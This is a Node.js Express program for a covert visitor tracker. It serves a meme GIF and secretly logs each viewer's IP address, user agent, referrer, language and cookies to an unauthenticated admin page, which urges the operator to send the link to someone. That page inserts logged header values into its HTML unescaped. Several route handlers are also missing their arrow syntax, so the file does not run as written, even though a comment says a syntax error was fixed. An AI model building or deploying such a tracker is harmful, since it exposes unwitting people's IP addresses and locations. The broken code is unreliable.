const express = require('express');
const https = require('https');
const app = express();

// CONFIG
const TARGET_GIF = 'https://media3.giphy.com/media/26n6WywJyh39n1pBu/giphy.gif';
const PORT = process.env.PORT || 3000;

// IN-M MEMORY STORAGE
let visitorLogs = [];

function getClientInfo(req) {
    let ip = req.headers['x-forwarded-for']?.split(',')[0].trim() 
          || req.headers['x-real-ip'] 
          || req.socket.remoteAddress || 'Unknown';
    
    if (ip && ip.startsWith('::ffff:')) {
        ip = ip.substring(7);
    }

    return {
        ip: ip,
        timestamp: new Date().toISOString(),
        userAgent: req.headers['user-agent'],
        referrer: req.headers['referer'] || 'direct',
        language: req.headers['accept-language']?.split(',')[0] || 'unknown',
        // Capture cookies sent to YOUR server (usually none unless you own the domain)
        cookies: req.headers['cookie'] || 'None (Blocked by Browser Security)',
        // Capture any custom headers that might leak info
        origin: req.headers['origin'] || 'None',
        host: req.headers['host']
    };
}

// Main Tracking Endpoint
app.get('/meme.gif', (req, res) {
    const data = getClientInfo(req);
    
    console.log(`[+] New Hit: ${data.ip}`);
    
    // Store in memory
    visitorLogs.push(data);
    
    // Limit memory usage (keep last 100 logs only)
    if (visitorLogs.length > 100) {
        visitorLogs.shift();
    }

    // Proxy the GIF (Fixed Syntax Error Here)
    https.get(TARGET_GIF, (gifRes) => {
        res.setHeader('Content-Type', 'image/gif');
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        gifRes.pipe(res);
    }).on('error', (err) => {
        console.error('GIF Fetch Error:', err);
        res.status(500).send('Error fetching image');
    });
});

// Admin Dashboard
app.get('/admin', (req, res) {
    if (visitorLogs.length === 0) {
        return res.send('No logs yet. Send the link to someone!');
    }

    let html = `
    <html>
    <head>
        <title>Visitor Logs</title>
        <style>
            body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
            h1 { color: #fff; }
            .log-entry { border-bottom: 1px solid #333; padding: 10px 0; }
            .label { color: #aaa; }
            .sensitive { color: #f00; font-weight: bold; }
        </style>
    </head>
    <body>
        <h1>Active Visitor Logs (${visitorLogs.length})</h1>
        <p>Warning: Logs are stored in memory only. They will be lost if the server restarts.</p>
        <p><strong>Note on Cookies:</strong> Browsers block images from stealing cookies for other sites (e.g., you cannot steal Google cookies with an image link). You will only see cookies if the user has previously visited YOUR specific domain.</p>
    `;
    
    const recentLogs = [...visitorLogs].reverse().slice(0, 50);
    
    recentLogs.forEach(log => {
        const cookieDisplay = log.cookies === 'None (Blocked by Browser Security)' ? 
            '<span class="sensitive">No Cookies (Browser Security Blocked This)</span>' : 
            `<span class="sensitive">${log.cookies}</span>`;

        html += `
        <div class="log-entry">
            <div><span class="label">Time:</span> ${log.timestamp}</div>
            <div><span class="label">IP:</span> ${log.ip}</div>
            <div><span class="label">User-Agent:</span> ${log.userAgent.substring(0, 100)}...</div>
            <div><span class="label">Referrer:</span> ${log.referrer}</div>
            <div><span class="label">Cookies:</span> ${cookieDisplay}</div>
            <div><span class="label">Origin Header:</span> ${log.origin}</div>
        </div>
        `;
    });
    
    html += '</body></html>';
    res.send(html);
});

// Root redirect
app.get('/', (req, res) {
    res.redirect('/meme.gif');
});

// Start Server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Status: OK - Memory logging active`);
});
